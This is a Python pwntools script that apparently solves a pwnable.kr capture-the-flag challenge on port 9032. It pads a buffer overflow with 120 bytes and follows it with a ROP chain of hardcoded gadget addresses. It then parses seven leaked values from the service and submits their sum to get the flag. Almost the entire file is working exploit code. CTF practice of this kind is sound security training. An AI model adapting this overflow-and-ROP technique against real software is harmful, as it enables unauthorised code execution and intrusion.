from pwn import *

#hardcoded values for ropchain
offset = 120
a_addr = 0x0809fe4b
b_addr = 0x0809fe6a
c_addr = 0x0809fe89
d_addr = 0x0809fea8
e_addr = 0x0809fec7
f_addr = 0x0809fee6
g_addr = 0x0809ff05
ropme  = 0x0809fffc

#build out ropchain
payload  = b"A" * offset 
payload += p32(a_addr)
payload += p32(b_addr)
payload += p32(c_addr)
payload += p32(d_addr)
payload += p32(e_addr)
payload += p32(f_addr)
payload += p32(g_addr)
payload += p32(ropme)

def navigate_menu(r_process):

    #recv message until first prompt for menu selection
    msg = r_process.recvuntil(":")
    for m in msg.split(b"\n"):
        print(m.decode())
    #send an invalid entry since we don't care here
    r_process.send(b"1\n")
    #recv message until xp prompt
    msg = r_process.recvuntil(": ")
    for m in msg.split(b"\n"):
        print(m.decode())

def parse_xp(message):

    #convert bytes object to string for parsing
    msg = message.decode()
    print(msg)
    #grab only digits and convert to int
    num = "".join(filter(str.isdigit, msg))
    #determine if number is positive or negative
    sign = msg[msg.find(num)-1]
    if sign == "-":
        return int(num) * -1
    else:
        return int(num)

def main():

    p = remote("pwnable.kr", 9032)
    navigate_menu(p)

    #send out payload for stage 1
    print(f"Sending ROP chain")
    p.sendline(payload)

    #at this point we will start receiving data back
    #we will need to retrieve the numbers and add them
    sum = 0
    for _ in range(7):
        tmp_num = parse_xp(p.recvuntil(")\n"))
        print(f"Received tmp num: {tmp_num}")
        sum += tmp_num

    print(f"Calculated sum: {sum}")

    #for stage two we submit the sum instead of an overflow
    navigate_menu(p)
    p.sendline(str(sum))

    #p.interactive()
    flag = p.recv(1024,timeout=.1)
    for f in flag.split(b"\n"):
        if b"Magic" in f:
            print("Flag: Redacted")
        else:
            print(f.decode())


if __name__ == "__main__":
    main()
